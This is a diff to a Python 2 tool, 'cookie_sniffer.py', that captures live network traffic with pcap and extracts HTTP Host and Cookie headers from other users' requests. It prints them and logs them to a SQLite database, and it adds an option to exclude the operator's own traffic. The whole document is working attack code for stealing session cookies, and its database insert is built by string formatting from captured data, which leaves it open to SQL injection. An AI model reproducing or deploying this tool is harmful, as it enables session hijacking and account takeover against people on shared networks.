@@ -7,10 +7,22 @@ import struct
 import re
 import datetime
 import sqlite3
+import fcntl
+import time
+from optparse import OptionParser
 
 protocols = {socket.IPPROTO_TCP: 'tcp',
            socket.IPPROTO_UDP: 'udp',
            socket.IPPROTO_ICMP: 'icmp'}
+
+
+def get_ip_address(ifname):
+    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    return socket.inet_ntoa(fcntl.ioctl(
+        s.fileno(),
+        0x8915,  # SIOCGIFADDR
+        struct.pack('256s', ifname[:15])
+    )[20:24])
 
 
 def decode_ip_packet(s):
@@ -67,9 +79,7 @@ class myhttpdump():
             elif re_cookie.search(data):
                 self.header_cookie = re_cookie.search(data).group(1)
 
-                _datetime = datetime.datetime.now().strftime("%Y/%m/%d %H:%M:%S")
-
-                return {'src_ip': decoded['source_address'], 'dest_ip': decoded['destination_address'], 'host': self.header_host, 'cookie': self.header_cookie, 'datetime': _datetime}
+                return {'src_ip': decoded['source_address'], 'dest_ip': decoded['destination_address'], 'host': self.header_host, 'cookie': self.header_cookie}
 
 
 def print_packet(pktlen, data, timestamp):
@@ -78,6 +88,7 @@ def print_packet(pktlen, data, timestamp):
     else:
     # if data[12:14]=='\x08\x00':
         decoded = decode_ip_packet(data[14:])
+        _datetime = time.strftime("%Y/%m/%d %H:%M:%S", time.localtime(timestamp))
         # print '\n%s.%f %s > %s' % (time.strftime('%H:%M', time.localtime(timestamp)), timestamp % 60, decoded['source_address'], decoded['destination_address'])
         # for key in ['version', 'header_len', 'tos', 'total_len', 'id', 'flags', 'fragment_offset', 'ttl']:
         #   print '  %s: %d' % (key, decoded[key])
@@ -91,22 +102,27 @@ def print_packet(pktlen, data, timestamp):
 
         if http_decoded:
             d = http_decoded
+            if not (options.no_log_me and d['src_ip'] == get_ip_address(options.iface)):
+                print '%s [%s > %s]' % (_datetime, d['src_ip'], d['dest_ip'])
+                print 'Host: %s' % d['host']
+                print 'Cookie: %s\n\n' % d['cookie']
 
-            print '%s [%s > %s]' % (d['datetime'], d['src_ip'], d['dest_ip'])
-            print 'Host: %s' % d['host']
-            print 'Cookie: %s\n\n' % d['cookie']
-
-            conn = sqlite3.connect('cookie_sniffer.db')
-            cursor = conn.cursor()
-            cursor.execute("INSERT INTO http_data (source_ip, destination_ip, host, cookie, datetime) VALUES ('%s', '%s', '%s', '%s', '%s');" % (d['src_ip'], d['dest_ip'], d['host'], d['cookie'], d['datetime']))
-            conn.commit()
-            conn.close()
+                conn = sqlite3.connect('cookie_sniffer.db')
+                cursor = conn.cursor()
+                cursor.execute("INSERT INTO http_data (source_ip, destination_ip, host, cookie, datetime) VALUES ('%s', '%s', '%s', '%s', '%s');" % (d['src_ip'], d['dest_ip'], d['host'], d['cookie'], _datetime))
+                conn.commit()
+                conn.close()
 
 
 if __name__ == '__main__':
-    if len(sys.argv) == 2:
+    parser = OptionParser('%prog -i interface >> outputfile')
+    parser.add_option("-i", "--iface", dest="iface", action="store", help="monitor on the specified interface")
+    parser.add_option("--no-log-me", dest="no_log_me", action="store_true", default=False, help="don't log local traffice")
+    (options, args) = parser.parse_args()
+
+    if options.iface:
         p = pcap.pcapObject()
-        dev = sys.argv[1]
+        dev = options.iface
         # comment follow line for open monitor device
         #net, mask = pcap.lookupnet(dev)
         p.open_live(dev, 1600, 0, 100)
@@ -121,7 +137,6 @@ if __name__ == '__main__':
             print 'shutting down'
             print '%d packets received, %d packets dropped, %d packets dropped by interface' % p.stats()
     else:
-        print 'usage:\n    # cookie_sniffer.py <interface> >> outputfile'
-        exit(10)
+        print parser.get_usage()
 
 exit(1)
